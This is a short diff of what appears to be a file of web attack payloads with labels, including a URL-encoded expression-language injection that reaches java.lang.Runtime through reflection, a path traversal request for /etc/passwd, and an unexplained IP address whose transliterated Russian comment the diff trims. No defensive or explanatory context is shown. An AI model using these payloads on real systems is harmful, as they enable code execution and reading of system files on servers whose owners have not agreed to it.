@@ -144,7 +144,7 @@ potential_attack = XSS(Reflected)
 payload = actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D
 pottential_attack = SSTI via uploaded malicious
 
-vrode 78.109.191.117 ne ponyatno chei ip tupo kashu skinuli
+vrode 78.109.191.117
 payload = view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 potential_attack = Path traversal
 
